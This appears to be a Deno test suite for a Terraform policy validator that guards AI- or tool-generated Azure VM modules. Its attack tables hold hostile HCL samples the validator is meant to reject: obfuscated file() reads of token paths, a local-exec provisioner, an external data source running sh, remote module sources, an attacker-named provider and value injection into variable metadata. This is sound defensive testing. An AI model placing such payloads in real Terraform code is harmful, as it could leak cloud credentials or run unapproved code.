import { CREATE_VM_INPUT_SCHEMA, CREATE_VM_VARIABLES, validateDraft, validateGeneratedDraftFiles, type DraftResult } from "./terraform-draft-policy.ts";

function assert(ok: unknown, message: string) { if (!ok) throw new Error(message); }
const clone = <T>(v: T): T => JSON.parse(JSON.stringify(v));
function resource(name: string, type: string) {
  return `resource "azapi_resource" "${name}" {
    type = "${type}"
    name = each.key
    parent_id = var.target_resource_group_id
    location = var.location
    for_each = toset(var.vm_names)
    body = { properties = { subnet_id = var.subnet_id } }
    lifecycle {
      precondition {
      condition = length(trimspace(var.change_request_id)) >= 6
      error_message = "Change request required."
      }
    }
  }`;
}
export function validDraft(): DraftResult {
  return {
    moduleName: "vm-create", displayName: "Create VMs", rationale: "Offline policy fixture, not a deployable VM.",
    variables: clone(CREATE_VM_VARIABLES), inputSchema: clone(CREATE_VM_INPUT_SCHEMA),
    moduleMainTf: `${resource("vm", "Microsoft.Compute/virtualMachines@2024-07-01")}\n${resource("nic", "Microsoft.Network/networkInterfaces@2023-11-01")}`,
    moduleVariablesTf: CREATE_VM_VARIABLES.map((v) => `variable "${v.name}" {
      type = ${v.type}
      ${v.name === "tags" ? "default = {}" : ""}
      ${["vm_names", "vm_size", "change_request_id"].includes(v.name) ? `validation {
        condition = length(var.${v.name}) >= 1
        error_message = "Input required."
      }` : ""}
    }`).join("\n"),
    moduleOutputsTf: `output "vm_ids" { value = { for name, vm in azapi_resource.vm : name => vm.id } }`,
  };
}
export function validFiles(draft = validDraft()) {
  const module = `terraform/modules/${draft.moduleName}`;
  const root = `terraform/environments/pilot/${draft.moduleName}`;
  const versions = `terraform {
    required_version = ">= 1.9.0, < 2.0.0"
    required_providers {
      azapi = {
        source = "Azure/azapi"
        version = "~> 2.0"
      }
    }
  }`;
  return [
    { path: `${module}/main.tf`, content: draft.moduleMainTf },
    { path: `${module}/variables.tf`, content: draft.moduleVariablesTf },
    { path: `${module}/outputs.tf`, content: draft.moduleOutputsTf },
    { path: `${module}/versions.tf`, content: versions },
    { path: `${root}/versions.tf`, content: versions },
    { path: `${root}/main.tf`, content: `provider "azapi" {
      use_cli = false
      use_oidc = true
      client_id_file_path = var.tfc_azure_dynamic_credentials.default.client_id_file_path
      oidc_token_file_path = var.tfc_azure_dynamic_credentials.default.oidc_token_file_path
    }
    module "${draft.moduleName.replace(/-/g, "_")}" {
      source = "../../../modules/${draft.moduleName}"
      ${CREATE_VM_VARIABLES.map((v) => `${v.name} = var.${v.name}`).join("\n")}
    }` },
    { path: `${root}/variables.tf`, content: `${CREATE_VM_VARIABLES.map((v) => `variable "${v.name}" {\n type = ${v.type}\n${v.name === "tags" ? "default = {}\n" : ""}}`).join("\n")}
    variable "tfc_azure_dynamic_credentials" {
      type = object({
        default = object({
          client_id_file_path = string
          oidc_token_file_path = string
        })
        aliases = map(object({
          client_id_file_path = string
          oidc_token_file_path = string
        }))
      })
    }` },
  ];
}

Deno.test("real HCL parser accepts bounded VM/NIC draft and complete OIDC root", () => {
  const draft = validDraft();
  assert(validateDraft(draft).length === 0, JSON.stringify(validateDraft(draft)));
  assert(validateGeneratedDraftFiles(draft, validFiles(draft)).length === 0, JSON.stringify(validateGeneratedDraftFiles(draft, validFiles(draft))));
});

const attacks: Array<[string, (draft: DraftResult) => void]> = [
  ["resource hidden in variables.tf", (d) => { d.moduleVariablesTf += '\nresource "null_resource" "run" {}'; }],
  ["resource hidden in outputs.tf", (d) => { d.moduleOutputsTf += '\nresource "azurerm_resource_group" "rg" {}'; }],
  ["unapproved resource label", (d) => { d.moduleMainTf = d.moduleMainTf.replace('"azapi_resource" "vm"', '"terraform_data" "vm"'); }],
  ["interpolated resource type", (d) => { d.moduleMainTf = d.moduleMainTf.replace('Microsoft.Compute/virtualMachines@2024-07-01', '${var.os_offer}'); }],
  ["extra allowed-looking type in comment", (d) => { d.moduleMainTf = '# type = "Microsoft.Compute/virtualMachines@2024-07-01"\nresource "null_resource" "bad" {}'; }],
  ["nested provisioner", (d) => { d.moduleMainTf = d.moduleMainTf.replace('body =', 'provisioner "local-exec" { command = "echo bad" }\nbody ='); }],
  ["data source", (d) => { d.moduleMainTf += '\ndata "external" "secret" { program = ["sh"] }'; }],
  ["provider configuration", (d) => { d.moduleOutputsTf += '\nprovider "http" {}'; }],
  ["module source", (d) => { d.moduleMainTf += '\nmodule "remote" { source = "https://example.invalid/module.zip" }'; }],
  ["backend", (d) => { d.moduleVariablesTf += '\nterraform { backend "http" {} }'; }],
  ["filesystem function", (d) => { d.moduleOutputsTf = 'output "secret" { value = file("/tmp/oidc") }'; }],
  ["templatefile", (d) => { d.moduleOutputsTf = 'output "secret" { value = templatefile("/tmp/token", {}) }'; }],
  ["multiline function call", (d) => { d.moduleOutputsTf = 'output "secret" { value = file\n("/tmp/token") }'; }],
  ["comment-obfuscated function", (d) => { d.moduleOutputsTf = 'output "secret" { value = file /* hide */ ("/tmp/token") }'; }],
  ["heredoc interpolation", (d) => { d.moduleOutputsTf = 'output "secret" {\nvalue = <<EOT\n${file("/tmp/token")}\nEOT\n}'; }],
  ["escaped string interpolation", (d) => { d.moduleOutputsTf = 'output "secret" { value = "${file("/tmp/token")}" }'; }],
  ["credential traversal", (d) => { d.moduleOutputsTf = 'output "secret" { value = var.tfc_azure_dynamic_credentials }'; }],
  ["metadata name injection", (d) => { d.variables[0].name = 'x" {}\nprovider "evil'; }],
  ["metadata type injection", (d) => { d.variables[0].type = 'string\n}\nprovider "evil" {'; }],
  ["reserved credential metadata", (d) => { d.variables.push({name: "tfc_azure_dynamic_credentials", type: "string", description: ""}); }],
  ["metadata description interpolation", (d) => { d.variables[0].description = '${file("/tmp/token")}'; }],
  ["unconstrained typed input", (d) => { (d.inputSchema.fields as Record<string, unknown>[])[0].type = 'any'; }],
  ["input source substitution", (d) => { (d.inputSchema.fields as Record<string, unknown>[])[0].source = 'parameters.__proto__.secret'; }],
  ["duplicate variable", (d) => { d.variables.push(clone(d.variables[0])); }],
  ["duplicate schema field", (d) => { const fields = d.inputSchema.fields as unknown[]; fields[1] = clone(fields[0]); }],
  ["resource scope override", (d) => { d.moduleMainTf = d.moduleMainTf.replace('parent_id = var.target_resource_group_id', 'parent_id = "other-scope"'); }],
  ["count overrides finite target set", (d) => { d.moduleMainTf = d.moduleMainTf.replace('for_each = toset(var.vm_names)', 'count = 100000'); }],
  ["guest execution payload", (d) => { d.moduleMainTf = d.moduleMainTf.replace('subnet_id = var.subnet_id', 'customData = "run-script"'); }],
  ["missing correlation guard", (d) => { d.moduleMainTf = d.moduleMainTf.replace('length(trimspace(var.change_request_id)) >= 6', 'true'); }],
  ["malformed HCL", (d) => { d.moduleMainTf += '\nresource {'; }],
];
for (const [label, mutate] of attacks) Deno.test(`rejects ${label}`, () => {
  const draft = validDraft(); mutate(draft);
  assert(validateDraft(draft).length > 0, `Policy accepted ${label}.`);
});

const rootAttacks: Array<[string, (files: ReturnType<typeof validFiles>) => void]> = [
  ["root resource injection", (files) => { files.find((f) => f.path.endsWith('/vm-create/main.tf') && f.path.includes('/pilot/'))!.content += '\nresource "null_resource" "run" {}'; }],
  ["remote module source", (files) => { files[5].content = files[5].content.replace('../../../modules/vm-create', 'git::https://example.invalid/module'); }],
  ["OIDC override", (files) => { files[5].content = files[5].content.replace('use_cli = false', 'use_cli = true'); }],
  ["client secret", (files) => { files[5].content = files[5].content.replace('use_cli = false', 'client_secret = "bad"\nuse_cli = false'); }],
  ["unapproved provider", (files) => { files[3].content = files[3].content.replace('Azure/azapi', 'attacker/azapi'); }],
  ["backend injection", (files) => { files[3].content = files[3].content.replace('required_version', 'backend "http" {}\nrequired_version'); }],
  ["undeclared extra generated file", (files) => { files.push({path: 'terraform/modules/vm-create/evil.tf', content: 'resource "null_resource" "evil" {}'}); }],
  ["missing file", (files) => { files.pop(); }],
  ["duplicate file", (files) => { files.push({...files[0]}); }],
];
for (const [label, mutate] of rootAttacks) Deno.test(`rejects generated archive ${label}`, () => {
  const draft = validDraft(); const files = validFiles(draft); mutate(files);
  assert(validateGeneratedDraftFiles(draft, files).length > 0, `Policy accepted ${label}.`);
});
